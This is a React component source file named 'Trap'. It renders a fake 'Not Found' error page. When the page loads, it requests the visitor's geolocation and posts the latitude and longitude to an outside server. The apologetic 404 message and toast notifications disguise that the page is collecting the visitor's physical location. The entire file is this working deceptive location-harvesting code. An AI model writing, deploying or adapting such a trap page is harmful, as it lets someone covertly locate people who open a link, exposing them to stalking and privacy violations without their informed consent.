/* eslint-disable react-hooks/rules-of-hooks */
import React from "react";
import axios from "axios";
import { useEffect } from "react";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const Trap = () => {
  useEffect(() => {
    getLocation();
  }, []);

  function getLocation() {
    navigator.geolocation.getCurrentPosition(async (position) => {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;

      const body = {
        deviceLatitude: latitude,
        deviceLongitude: longitude,
      };
      main(body);
    });
  }

  async function main(body) {
    const query = await axios.post(`https://device-probe.vercel.app/`, {
      deviceLatitude: body.deviceLatitude,
      deviceLongitude: body.deviceLongitude,
    });

    console.log(query.data);
    query.data !== undefined
      ? toast.success("sorry for inconvenience")
      : toast.warn("sorry for inconvenience");
    return query.data;

  }
  return (
    <>
      <div className="not-found">
        <h1>Not Found</h1>
        <p>We're sorry, but the page you requested could not be found.</p>
        <button>Go Back</button>
      </div>
      <ToastContainer />
    </>
  );
};

export default Trap;
